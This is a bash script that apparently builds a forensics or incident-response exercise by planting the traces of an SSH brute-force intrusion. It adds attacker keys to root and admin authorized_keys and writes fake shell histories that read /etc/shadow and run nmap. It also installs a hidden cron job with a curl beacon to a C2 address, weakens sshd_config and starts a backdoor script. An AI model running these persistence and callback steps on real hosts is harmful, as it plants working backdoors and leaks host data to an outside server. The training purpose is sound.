#!/bin/bash
# Plant post-attack artifacts for SSH brute force scenario on server_3
# Attacker: 192.168.1.50 → admin account via SSH brute force → root via sudo

# --- Log artifacts ---
cat /opt/artifacts/auth.log >> /var/log/auth.log
cat /opt/artifacts/syslog_attack >> /var/log/syslog

# --- SSH persistence: attacker public key ---
mkdir -p /home/admin/.ssh /root/.ssh
cp /opt/artifacts/authorized_keys /home/admin/.ssh/authorized_keys
cp /opt/artifacts/authorized_keys /root/.ssh/authorized_keys
chmod 700 /home/admin/.ssh /root/.ssh
chmod 600 /home/admin/.ssh/authorized_keys /root/.ssh/authorized_keys
chown -R admin:admin /home/admin/.ssh

# --- Bash history for admin user ---
cat > /home/admin/.bash_history << 'HIST'
whoami
id
uname -a
cat /etc/passwd
sudo su
HIST
chown admin:admin /home/admin/.bash_history

# --- Bash history for root (post-escalation recon + persistence) ---
cat > /root/.bash_history << 'HIST'
id
cat /etc/shadow
cat /etc/passwd
ip addr
ss -tlnp
/tmp/.tools/nmap -sn 10.0.0.0/8
/tmp/.tools/nmap -sV 10.0.4.6
/tmp/.tools/nmap -sV 10.0.2.1
ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
cat /root/.ssh/id_rsa.pub >> /home/admin/.ssh/authorized_keys
echo "*/5 * * * * root /tmp/.update >/dev/null 2>&1" > /etc/cron.d/.persistence
chmod 644 /etc/cron.d/.persistence
echo "MaxAuthTries 50" >> /etc/ssh/sshd_config
HIST

# --- Persistence: cron job running C2 callback every 5 minutes ---
cat > /etc/cron.d/.persistence << 'CRON'
*/5 * * * * root /tmp/.update >/dev/null 2>&1
CRON
chmod 644 /etc/cron.d/.persistence

# --- Dropped tools and scripts ---
cat > /tmp/.update << 'SCRIPT'
#!/bin/bash
# C2 callback beacon
curl -s -o /dev/null http://192.168.1.50:8443/beacon?id=$(hostname) 2>/dev/null || true
SCRIPT
chmod +x /tmp/.update

mkdir -p /tmp/.tools
cat > /tmp/.tools/nmap << 'SCRIPT'
#!/bin/bash
echo "nmap placeholder - attacker's static binary"
SCRIPT
chmod +x /tmp/.tools/nmap

# --- Recon output left behind ---
cat > /tmp/.recon_results << 'RECON'
Starting Nmap scan at 2026-02-06 10:17
Nmap scan report for 10.0.2.1
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
53/tcp open  domain  dnsmasq 2.85

Nmap scan report for 10.0.4.6
PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.2.14
139/tcp open  netbios-ssn Samba smbd 4.2.14
5432/tcp open postgresql  PostgreSQL 9.4.26

Nmap done: 256 IP addresses (6 hosts up) scanned
RECON

# --- Weaken SSH config (evidence of attacker modification) ---
echo "MaxAuthTries 50" >> /etc/ssh/sshd_config

# --- Start disguised backdoor process ---
nohup /opt/artifacts/backdoor.sh >/dev/null 2>&1 &

# --- Simulate live attacker SSH session (requires sshd to be running) ---
# Wait for sshd to be accepting connections
for i in $(seq 1 10); do
    if ss -tlnp | grep -q ':22'; then break; fi
    sleep 1
done
# Open a persistent SSH session as admin, then escalate to root via sudo.
# This creates real utmp/wtmp entries visible in w/who/last, a proper
# process tree in ps, and a TCP socket in ss.
sshpass -p password123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -f admin@127.0.0.1 \
    "sudo bash -c 'while true; do sleep 3600; done'"
